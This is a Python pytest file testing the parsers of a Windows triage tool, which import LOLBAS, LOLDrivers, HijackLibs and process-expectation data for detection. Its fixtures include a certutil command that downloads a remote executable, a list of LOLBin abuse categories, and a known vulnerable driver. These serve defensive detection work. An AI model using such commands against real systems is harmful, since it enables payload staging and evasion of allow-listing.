"""Tests for importer YAML parsing logic.

Tests the parsing functions in importers without requiring actual
LOLBAS/LOLDrivers/HijackLibs repositories.
"""

import json
import pytest
import sqlite3
import tempfile
from pathlib import Path
from unittest.mock import patch, mock_open

import yaml

from windows_triage.importers.lolbas import (
    import_lolbas,
    _parse_lolbas_yml,
    get_lolbin_functions,
)
from windows_triage.importers.loldrivers import (
    import_loldrivers,
    _parse_loldriver_yaml,
)
from windows_triage.importers.hijacklibs import (
    import_hijacklibs,
    _parse_hijacklib_yaml,
    _normalize_path_var,
    get_hijack_types,
)
from windows_triage.importers.process_expectations import (
    load_process_expectations,
    import_process_expectations,
    get_process_tree,
    get_system_processes,
    get_user_processes,
    DEFAULT_YAML_PATH,
)


# ============================================================================
# LOLBAS Importer Tests
# ============================================================================

class TestLolbasParser:
    """Tests for LOLBAS YAML parsing."""

    def test_parse_valid_lolbin(self, tmp_path):
        """Test parsing a valid LOLBAS YAML file."""
        yml_content = """
Name: Certutil.exe
Description: Certificate utility
Commands:
  - Command: certutil -urlcache -split -f http://example.com/file.exe
    Description: Download file
    Category: Download
    MitreID: T1105
  - Command: certutil -encode file.exe encoded.txt
    Category: Encode
    MitreID: T1140
Full_Path:
  - Path: C:\\Windows\\System32\\certutil.exe
  - Path: C:\\Windows\\SysWOW64\\certutil.exe
Detection:
  - IOC: certutil.exe with -urlcache flag
Aliases:
  - Alias: cert
"""
        yml_file = tmp_path / "Certutil.yml"
        yml_file.write_text(yml_content)

        result = _parse_lolbas_yml(yml_file, "OSBinaries")

        assert result is not None
        assert result['name'] == 'Certutil.exe'
        assert result['filename_lower'] == 'certutil.exe'
        assert 'Download' in result['functions']
        assert 'Encode' in result['functions']
        assert 'T1105' in result['mitre_techniques']
        assert 'T1140' in result['mitre_techniques']
        assert len(result['expected_paths']) == 2
        assert result['detection'] is not None
        assert 'cert' in result['aliases']

    def test_parse_minimal_lolbin(self, tmp_path):
        """Test parsing LOLBAS file with minimal data."""
        yml_content = """
Name: Simple.exe
"""
        yml_file = tmp_path / "Simple.yml"
        yml_file.write_text(yml_content)

        result = _parse_lolbas_yml(yml_file, "OSBinaries")

        assert result is not None
        assert result['name'] == 'Simple.exe'
        assert result['filename_lower'] == 'simple.exe'
        assert result['functions'] == []
        assert result['expected_paths'] == []

    def test_parse_empty_file(self, tmp_path):
        """Test parsing empty YAML file."""
        yml_file = tmp_path / "Empty.yml"
        yml_file.write_text("")

        result = _parse_lolbas_yml(yml_file, "OSBinaries")
        assert result is None

    def test_parse_invalid_yaml(self, tmp_path):
        """Test parsing invalid YAML."""
        yml_file = tmp_path / "Invalid.yml"
        yml_file.write_text("{ invalid: yaml: content")

        result = _parse_lolbas_yml(yml_file, "OSBinaries")
        assert result is None

    def test_parse_no_name(self, tmp_path):
        """Test parsing YAML without Name field."""
        yml_content = """
Description: No name field
"""
        yml_file = tmp_path / "NoName.yml"
        yml_file.write_text(yml_content)

        result = _parse_lolbas_yml(yml_file, "OSBinaries")
        assert result is None


class TestLolbasImport:
    """Tests for LOLBAS database import."""

    @pytest.fixture
    def context_db(self, tmp_path):
        """Create a temporary context database."""
        db_path = tmp_path / "context.db"
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        cursor.execute("""
            CREATE TABLE lolbins (
                id INTEGER PRIMARY KEY,
                filename_lower TEXT NOT NULL UNIQUE,
                name TEXT,
                description TEXT,
                functions TEXT,
                expected_paths TEXT,
                mitre_techniques TEXT,
                detection TEXT,
                source_url TEXT
            )
        """)
        conn.commit()
        conn.close()
        return db_path

    def test_import_lolbas_directory_not_found(self, context_db, tmp_path):
        """Test import with non-existent directory."""
        stats = import_lolbas(context_db, tmp_path / "nonexistent")
        assert stats['lolbins_imported'] == 0
        assert stats['errors'] == 0

    def test_import_lolbas_success(self, context_db, tmp_path):
        """Test successful LOLBAS import."""
        # Create yml directory structure
        yml_dir = tmp_path / "yml" / "OSBinaries"
        yml_dir.mkdir(parents=True)

        # Create test YAML file
        yml_content = """
Name: TestBin.exe
Description: Test binary
Commands:
  - Category: Execute
    MitreID: T1059
"""
        (yml_dir / "TestBin.yml").write_text(yml_content)

        stats = import_lolbas(context_db, tmp_path)

        assert stats['lolbins_imported'] == 1
        assert stats['errors'] == 0

        # Verify data was inserted
        conn = sqlite3.connect(context_db)
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM lolbins WHERE filename_lower = ?", ('testbin.exe',))
        row = cursor.fetchone()
        conn.close()

        assert row is not None


class TestLolbinFunctions:
    """Tests for get_lolbin_functions helper."""

    def test_get_lolbin_functions(self):
        """Test getting list of LOLBin abuse functions."""
        functions = get_lolbin_functions()
        assert 'Download' in functions
        assert 'Execute' in functions
        assert 'AWL Bypass' in functions
        assert 'Credentials' in functions
        assert len(functions) >= 10


# ============================================================================
# LOLDrivers Importer Tests
# ============================================================================

class TestLoldriversParser:
    """Tests for LOLDrivers YAML parsing."""

    def test_parse_valid_driver(self, tmp_path):
        """Test parsing a valid LOLDrivers YAML file."""
        yml_content = """
Id: driver-001
Category: vulnerable driver
Commands:
  Description: Vulnerable to arbitrary read/write
Resources:
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16098
Tags:
  - byovd
MitreID: T1068
KnownVulnerableSamples:
  - Filename: RTCore64.sys
    SHA256: 01aa278b07b58dc46c84bd0b1b5c8e9ee4e62ea0bf7a695862444af32e87f1fd
    SHA1: def456
    MD5: abc123
    Company: Micro-Star INT'L CO., LTD.
    Product: RTCore64
    Authentihash:
      SHA256: auth256
      SHA1: auth1
      MD5: authmd5
"""
        yml_file = tmp_path / "driver001.yaml"
        yml_file.write_text(yml_content)

        result = _parse_loldriver_yaml(yml_file)

        assert result is not None
        assert result['id'] == 'driver-001'
        assert result['category'] == 'vulnerable driver'
        assert result['cve'] == 'CVE-2019-16098'
        assert len(result['samples']) == 1
        sample = result['samples'][0]
        assert sample['filename_lower'] == 'rtcore64.sys'
        assert sample['sha256'] is not None
        assert sample['company'] == "Micro-Star INT'L CO., LTD."

    def test_parse_malicious_driver(self, tmp_path):
        """Test parsing malicious driver category."""
        yml_content = """
Id: malware-001
Category: malicious driver
KnownVulnerableSamples:
  - Filename: malware.sys
    SHA256: badbadbad
"""
        yml_file = tmp_path / "malware.yaml"
        yml_file.write_text(yml_content)

        result = _parse_loldriver_yaml(yml_file)

        assert result is not None
        assert 'malicious' in result['category'].lower()

    def test_parse_empty_file(self, tmp_path):
        """Test parsing empty YAML file."""
        yml_file = tmp_path / "empty.yaml"
        yml_file.write_text("")

        result = _parse_loldriver_yaml(yml_file)
        assert result is None

    def test_parse_no_samples(self, tmp_path):
        """Test parsing driver with no samples."""
        yml_content = """
Id: driver-nosample
Category: vulnerable driver
"""
        yml_file = tmp_path / "nosample.yaml"
        yml_file.write_text(yml_content)

        result = _parse_loldriver_yaml(yml_file)

        assert result is not None
        assert result['samples'] == []

    def test_cve_extraction_from_resources(self, tmp_path):
        """Test CVE extraction from resources."""
        yml_content = """
Id: driver-cve
Category: vulnerable driver
Resources:
  - Some unrelated text
  - https://example.com/CVE-2021-12345
  - More text
KnownVulnerableSamples: []
"""
        yml_file = tmp_path / "cvefile.yaml"
        yml_file.write_text(yml_content)

        result = _parse_loldriver_yaml(yml_file)

        assert result is not None
        assert result['cve'] == 'CVE-2021-12345'


class TestLoldriversImport:
    """Tests for LOLDrivers database import."""

    @pytest.fixture
    def context_db(self, tmp_path):
        """Create a temporary context database."""
        db_path = tmp_path / "context.db"
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        cursor.execute("""
            CREATE TABLE vulnerable_drivers (
                id INTEGER PRIMARY KEY,
                filename_lower TEXT,
                sha256 TEXT,
                sha1 TEXT,
                md5 TEXT,
                authentihash_sha256 TEXT,
                authentihash_sha1 TEXT,
                authentihash_md5 TEXT,
                vendor TEXT,
                product TEXT,
                cve TEXT,
                vulnerability_type TEXT,
                description TEXT
            )
        """)
        conn.commit()
        conn.close()
        return db_path

    def test_import_loldrivers_directory_not_found(self, context_db, tmp_path):
        """Test import with non-existent directory."""
        stats = import_loldrivers(context_db, tmp_path / "nonexistent")
        assert stats['vulnerable_imported'] == 0

    def test_import_loldrivers_filters_malicious(self, context_db, tmp_path):
        """Test that malicious drivers are filtered by default."""
        yaml_dir = tmp_path / "yaml"
        yaml_dir.mkdir()

        # Create malicious driver file
        yml_content = """
Id: malware-001
Category: malicious driver
KnownVulnerableSamples:
  - Filename: malware.sys
    SHA256: badbadbad
"""
        (yaml_dir / "malware.yaml").write_text(yml_content)

        stats = import_loldrivers(context_db, tmp_path, include_malicious=False)

        assert stats['vulnerable_imported'] == 0
        assert stats['malicious_imported'] == 0
        assert stats['skipped'] == 1

    def test_import_loldrivers_include_malicious(self, context_db, tmp_path):
        """Test including malicious drivers."""
        yaml_dir = tmp_path / "yaml"
        yaml_dir.mkdir()

        yml_content = """
Id: malware-001
Category: malicious driver
KnownVulnerableSamples:
  - Filename: malware.sys
    SHA256: badbadbad
"""
        (yaml_dir / "malware.yaml").write_text(yml_content)

        stats = import_loldrivers(context_db, tmp_path, include_malicious=True)

        assert stats['malicious_imported'] == 1

    def test_import_loldrivers_success(self, context_db, tmp_path):
        """Test successful vulnerable driver import."""
        yaml_dir = tmp_path / "yaml"
        yaml_dir.mkdir()

        yml_content = """
Id: vuln-001
Category: vulnerable driver
KnownVulnerableSamples:
  - Filename: vuln.sys
    SHA256: abc123
    MD5: def456
"""
        (yaml_dir / "vuln.yaml").write_text(yml_content)

        stats = import_loldrivers(context_db, tmp_path)

        assert stats['vulnerable_imported'] == 1
        assert stats['samples_imported'] == 1


# ============================================================================
# HijackLibs Importer Tests
# ============================================================================

class TestHijacklibsParser:
    """Tests for HijackLibs YAML parsing."""

    def test_parse_valid_hijacklib(self, tmp_path):
        """Test parsing a valid HijackLibs YAML file."""
        # Use single quotes for Windows paths to avoid YAML escape issues
        yml_content = """
Name: version.dll
Vendor: Microsoft
ExpectedLocations:
  - '%SYSTEM32%'
  - '%SYSWOW64%'
VulnerableExecutables:
  - Path: '%SYSTEM32%/notepad.exe'
    Type: Sideloading
    AutoElevate: false
  - Path: '%PROGRAMFILES%/App/app.exe'
    Type: Phantom
    PrivilegeEscalation: true
"""
        yml_file = tmp_path / "version.yml"
        yml_file.write_text(yml_content)

        result = _parse_hijacklib_yaml(yml_file)

        assert len(result) == 2
        assert result[0]['dll_name_lower'] == 'version.dll'
        assert result[0]['hijack_type'] == 'Sideloading'
        assert result[0]['vendor'] == 'Microsoft'
        assert '\\windows\\system32' in result[0]['expected_paths']

    def test_parse_no_vulnerable_exes(self, tmp_path):
        """Test parsing file with no vulnerable executables."""
        yml_content = """
Name: safe.dll
Vendor: Safe Corp
"""
        yml_file = tmp_path / "safe.yml"
        yml_file.write_text(yml_content)

        result = _parse_hijacklib_yaml(yml_file)
        assert result == []

    def test_parse_empty_file(self, tmp_path):
        """Test parsing empty file."""
        yml_file = tmp_path / "empty.yml"
        yml_file.write_text("")

        result = _parse_hijacklib_yaml(yml_file)
        assert result == []

    def test_parse_no_name(self, tmp_path):
        """Test parsing file without Name."""
        yml_content = """
Vendor: NoName Corp
"""
        yml_file = tmp_path / "noname.yml"
        yml_file.write_text(yml_content)

        result = _parse_hijacklib_yaml(yml_file)
        assert result == []


class TestNormalizePathVar:
    """Tests for path variable normalization."""

    def test_system32(self):
        """Test %SYSTEM32% normalization."""
        result = _normalize_path_var("%SYSTEM32%\\test.dll")
        assert result == "\\windows\\system32\\test.dll"

    def test_syswow64(self):
        """Test %SYSWOW64% normalization."""
        result = _normalize_path_var("%SYSWOW64%\\test.dll")
        assert result == "\\windows\\syswow64\\test.dll"

    def test_systemroot(self):
        """Test %SYSTEMROOT% normalization."""
        result = _normalize_path_var("%SYSTEMROOT%\\test.dll")
        assert result == "\\windows\\test.dll"

    def test_programfiles(self):
        """Test %PROGRAMFILES% normalization."""
        result = _normalize_path_var("%PROGRAMFILES%\\App\\test.dll")
        assert result == "\\program files\\app\\test.dll"

    def test_programfiles_x86(self):
        """Test %PROGRAMFILES(X86)% normalization."""
        result = _normalize_path_var("%PROGRAMFILES(X86)%\\App\\test.dll")
        assert result == "\\program files (x86)\\app\\test.dll"

    def test_appdata(self):
        """Test %APPDATA% normalization."""
        result = _normalize_path_var("%APPDATA%\\test.dll")
        assert "appdata\\roaming" in result

    def test_localappdata(self):
        """Test %LOCALAPPDATA% normalization."""
        result = _normalize_path_var("%LOCALAPPDATA%\\test.dll")
        assert "appdata\\local" in result

    def test_drive_letter_removal(self):
        """Test drive letter removal."""
        result = _normalize_path_var("C:\\Windows\\test.dll")
        assert result == "\\windows\\test.dll"

    def test_forward_slash_normalization(self):
        """Test forward slash normalization."""
        result = _normalize_path_var("C:/Windows/test.dll")
        assert result == "\\windows\\test.dll"

    def test_empty_string(self):
        """Test empty string."""
        result = _normalize_path_var("")
        assert result == ""


class TestHijacklibsImport:
    """Tests for HijackLibs database import."""

    @pytest.fixture
    def context_db(self, tmp_path):
        """Create a temporary context database."""
        db_path = tmp_path / "context.db"
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        cursor.execute("""
            CREATE TABLE hijackable_dlls (
                id INTEGER PRIMARY KEY,
                dll_name_lower TEXT NOT NULL,
                hijack_type TEXT,
                vulnerable_exe TEXT,
                vulnerable_exe_path TEXT,
                expected_paths TEXT,
                vendor TEXT
            )
        """)
        conn.commit()
        conn.close()
        return db_path

    def test_import_hijacklibs_directory_not_found(self, context_db, tmp_path):
        """Test import with non-existent directory."""
        stats = import_hijacklibs(context_db, tmp_path / "nonexistent")
        assert stats['dlls_imported'] == 0

    def test_import_hijacklibs_success(self, context_db, tmp_path):
        """Test successful HijackLibs import."""
        yml_dir = tmp_path / "yml"
        yml_dir.mkdir()

        yml_content = """
Name: test.dll
Vendor: Test Corp
VulnerableExecutables:
  - Path: "%SYSTEM32%\\app.exe"
    Type: Sideloading
"""
        (yml_dir / "test.yml").write_text(yml_content)

        stats = import_hijacklibs(context_db, tmp_path)

        assert stats['dlls_imported'] == 1
        assert stats['entries_imported'] == 1


class TestHijackTypes:
    """Tests for get_hijack_types helper."""

    def test_get_hijack_types(self):
        """Test getting list of hijack types."""
        types = get_hijack_types()
        assert 'Phantom' in types
        assert 'Sideloading' in types
        assert 'Search Order' in types


# ============================================================================
# Process Expectations Importer Tests
# ============================================================================

class TestProcessExpectationsImport:
    """Tests for process expectations import."""

    @pytest.fixture
    def context_db(self, tmp_path):
        """Create a temporary context database."""
        db_path = tmp_path / "context.db"
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        cursor.execute("""
            CREATE TABLE expected_processes (
                id INTEGER PRIMARY KEY,
                process_name_lower TEXT NOT NULL UNIQUE,
                valid_parents TEXT,
                suspicious_parents TEXT,
                never_spawns_children INTEGER DEFAULT 0,
                parent_exits INTEGER DEFAULT 0,
                valid_paths TEXT,
                user_type TEXT,
                valid_users TEXT,
                min_instances INTEGER DEFAULT 0,
                max_instances INTEGER,
                per_session INTEGER DEFAULT 0,
                required_args TEXT,
                source TEXT
            )
        """)
        conn.commit()
        conn.close()
        return db_path

    def test_load_process_expectations_default(self):
        """Test loading from default YAML path."""
        procs = load_process_expectations()
        # Should load from data/process_expectations.yaml
        assert len(procs) > 0

    def test_load_process_expectations_custom_path(self, tmp_path):
        """Test loading from custom YAML path."""
        yml_content = """
processes:
  - process_name: test.exe
    valid_parents:
      - parent.exe
    user_type: USER
    source: test
"""
        yml_path = tmp_path / "custom.yaml"
        yml_path.write_text(yml_content)

        procs = load_process_expectations(yml_path)
        assert len(procs) == 1
        assert procs[0]['process_name'] == 'test.exe'

    def test_load_process_expectations_missing_file(self, tmp_path):
        """Test loading from non-existent file."""
        procs = load_process_expectations(tmp_path / "nonexistent.yaml")
        assert procs == []

    def test_import_process_expectations_success(self, context_db, tmp_path):
        """Test successful import."""
        yml_content = """
processes:
  - process_name: test.exe
    valid_parents:
      - parent.exe
    suspicious_parents:
      - bad.exe
    never_spawns_children: false
    parent_exits: true
    valid_paths:
      - "\\\\windows\\\\system32\\\\test.exe"
    user_type: SYSTEM
    source: test
"""
        yml_path = tmp_path / "procs.yaml"
        yml_path.write_text(yml_content)

        stats = import_process_expectations(context_db, yml_path)

        assert stats['processes_imported'] == 1
        assert stats['errors'] == 0

        # Verify data
        conn = sqlite3.connect(context_db)
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM expected_processes WHERE process_name_lower = ?",
                      ('test.exe',))
        row = cursor.fetchone()
        conn.close()

        assert row is not None

    def test_import_process_expectations_empty(self, context_db, tmp_path):
        """Test import with empty processes."""
        yml_content = """
processes: []
"""
        yml_path = tmp_path / "empty.yaml"
        yml_path.write_text(yml_content)

        stats = import_process_expectations(context_db, yml_path)
        assert stats['processes_imported'] == 0


class TestProcessTreeHelpers:
    """Tests for process tree helper functions."""

    def test_get_process_tree_structure(self):
        """Test process tree has expected structure."""
        tree = get_process_tree()
        # Should have parent -> children mapping
        assert isinstance(tree, dict)
        # Should have some entries
        assert len(tree) > 0

    def test_get_system_processes_returns_list(self):
        """Test get_system_processes returns list."""
        procs = get_system_processes()
        assert isinstance(procs, list)

    def test_get_user_processes_returns_list(self):
        """Test get_user_processes returns list."""
        procs = get_user_processes()
        assert isinstance(procs, list)


# ============================================================================
# Error Handling Tests
# ============================================================================

class TestImporterErrorHandling:
    """Tests for error handling in importers."""

    def test_lolbas_handles_malformed_commands(self, tmp_path):
        """Test LOLBAS parser handles empty Commands section."""
        yml_content = """
Name: Test.exe
Commands: []
"""
        yml_file = tmp_path / "malformed.yml"
        yml_file.write_text(yml_content)

        # Should not raise, just return with empty functions
        result = _parse_lolbas_yml(yml_file, "OSBinaries")
        assert result is not None
        assert result['functions'] == []

    def test_loldriver_handles_malformed_samples(self, tmp_path):
        """Test LOLDrivers parser handles malformed samples."""
        yml_content = """
Id: test
Category: vulnerable driver
KnownVulnerableSamples:
  - null
  - Filename: valid.sys
    SHA256: abc123
"""
        yml_file = tmp_path / "malformed.yaml"
        yml_file.write_text(yml_content)

        result = _parse_loldriver_yaml(yml_file)
        assert result is not None
        # Should skip null entry, get valid one
        assert len(result['samples']) == 1

    def test_hijacklib_handles_empty_path(self, tmp_path):
        """Test HijackLibs parser handles empty path."""
        yml_content = """
Name: test.dll
VulnerableExecutables:
  - Path: ""
    Type: Sideloading
  - Path: "%SYSTEM32%\\app.exe"
    Type: Phantom
"""
        yml_file = tmp_path / "emptypath.yml"
        yml_file.write_text(yml_content)

        result = _parse_hijacklib_yaml(yml_file)
        # Should skip empty path entry
        assert len(result) == 1
